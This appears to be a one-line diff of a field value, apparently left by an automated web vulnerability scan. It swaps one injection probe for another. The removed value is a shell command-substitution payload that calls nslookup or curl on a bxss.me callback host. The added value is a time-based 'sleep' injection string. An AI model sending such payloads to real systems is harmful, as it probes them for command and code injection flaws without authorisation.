@@ -1,1 +1,1 @@
-$(nslookup -q=cname hitypiwwprfqp61775.bxss.me||curl hitypiwwprfqp61775.bxss.me)
+555"&&sleep(27*1000)*mpssfg&&"
